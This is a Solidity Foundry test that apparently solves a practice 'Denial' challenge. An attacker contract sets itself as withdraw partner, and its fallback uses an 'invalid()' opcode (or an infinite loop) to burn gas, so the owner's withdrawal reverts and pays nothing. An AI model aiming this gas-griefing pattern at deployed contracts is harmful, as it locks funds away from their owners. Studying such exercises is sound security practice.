// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Denial.sol";

contract CounterTest is Test {
    Denial victim;
    address owner = address(0xA9E);

    function setUp() public {
        victim = new Denial();
    }

    // withdraw 1% to recipient and 1% to owner
    function test_DenyWithdrawToOwner() public {
        vm.deal(address(victim), 10 ether);
        console.log(owner.balance);
        victim.setWithdrawPartner(address(this));
        vm.expectRevert();
        victim.withdraw{gas: 83629}();
        assertTrue(owner.balance == 0);
        console.log(owner.balance);
    }

    fallback() external payable {
        assembly {
            invalid()
        }

        // or
        // while(true){}
    }
}
